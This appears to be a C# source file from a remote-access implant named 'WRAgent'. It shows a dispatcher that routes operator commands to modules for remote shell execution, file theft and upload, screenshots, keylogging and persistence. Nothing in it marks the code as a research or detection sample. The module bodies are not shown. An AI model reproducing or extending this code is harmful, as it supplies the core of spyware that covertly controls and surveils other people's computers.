using System.Text.Json.Nodes;

namespace WRAgent
{
    internal static class ModuleHost
    {
        public static async Task<JsonObject> ExecuteAsync(string module, JsonObject args, Transport t)
        {
            switch (module)
            {
                case "shell":
                    return await ShellModule.Run(args).ConfigureAwait(false);

                case "exec":
                    return ShellModule.Exec(args);

                case "sysinfo":
                    return SystemModule.Info();

                case "ps":
                    return SystemModule.Processes();

                case "ls":
                    return FileModule.Ls(args);

                case "cat":
                    return FileModule.Cat(args);

                case "download":
                    return await FileModule.Download(args, t).ConfigureAwait(false);

                case "upload":
                    return FileModule.Upload(args);

                case "rm":
                case "mkdir":
                case "mv":
                case "cp":
                    return FileModule.Op(module, args);

                case "screenshot":
                    return await ScreenModule.Capture(t).ConfigureAwait(false);

                case "keylog":
                    return KeylogModule.Run(args);

                case "persist":
                    return PersistModule.Run(args);

                case "exit":
                    return new JsonObject { ["ok"] = true, ["stdout"] = "closing" };

                default:
                    return new JsonObject { ["ok"] = false, ["error"] = "unknown module: " + module };
            }
        }
    }
}
